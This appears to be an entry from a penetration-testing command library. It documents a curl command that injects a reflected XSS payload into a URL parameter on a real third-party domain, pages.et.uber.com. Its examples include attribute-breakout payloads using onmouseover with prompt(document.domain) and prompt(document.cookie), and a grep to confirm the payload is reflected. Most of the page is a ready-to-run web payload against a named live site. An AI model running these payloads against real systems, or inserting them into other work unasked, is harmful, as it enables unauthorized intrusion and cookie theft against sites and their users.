---
data: >-
  # Example: curl
  'https://pages.et.uber.com/icecream/?lang_id=%22%20onmouseover%3dprompt(document.domain)%20bad%3d%22'
tags:
  - xss
  - injection
type: command
executor: bash
platforms:
  - Web
id: 6d39493c-0f25-476c-98b5-48c25c1be40d
created_at: '2025-12-14T00:11:16.369Z'
updated_at: '2025-12-14T00:11:16.369Z'
verified: false
validated: true
submitted: true
---
# Inject XSS Payload URL

## Command

```bash
# Example: curl 'https://pages.et.uber.com/icecream/?lang_id=%22%20onmouseover%3dprompt(document.domain)%20bad%3d%22'
```

## Description

This command modifies a URL to inject an XSS payload into a parameter, allowing testing of reflected vulnerabilities by fetching the page response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The target URL with injected payload | Yes |

## Examples

### Basic Usage

```bash
curl 'https://pages.et.uber.com/icecream/?lang_id=%22%20onmouseover%3dprompt(9020)%20bad%3d%22'
```

### Advanced Usage

```bash
curl -s 'https://pages.et.uber.com/icecream/?lang_id=%22%20onmouseover%3dprompt(document.cookie)%20bad%3d%22' | grep 'onmouseover'
```

## Expected Output

HTML response containing the reflected payload, potentially executable in a browser.

## Related

- [[procedures/Craft-and-Inject-XSS-Payload]]
- [[commands/view-page-source]]
